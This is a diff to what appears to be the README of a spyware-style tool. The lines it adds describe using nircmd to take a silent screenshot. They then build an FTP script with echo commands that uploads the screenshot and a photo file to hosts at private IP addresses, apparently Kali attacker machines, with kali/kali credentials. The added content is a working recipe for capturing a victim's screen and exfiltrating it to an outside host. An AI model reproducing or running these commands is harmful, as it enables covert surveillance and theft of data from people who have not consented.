@@ -37,6 +37,26 @@ https://youtu.be/V67VIQB7N0w
 ## Other
 To gain spyware functionalities you can use nircmd: https://www.nirsoft.net/utils/nircmd.html
 
+## nircmd screenshot usage
+nircmd.exe savescreenshot screen1.png
+
+##ftp echos
+echo open 192.168.1.171> ftp.txt
+echo kali>> ftp.txt
+echo kali>> ftp.txt
+echo bin>> ftp.txt
+echo put s1.png>> ftp.txt
+echo bye>> ftp.txt
+
+ftp -s:ftp.txt
+
+open 192.168.44.130
+kali
+kali
+put P1010975.JPG
+bye
+
+
 ## License
 Open Source<br>
 **Free Software, Hell Yeah!**
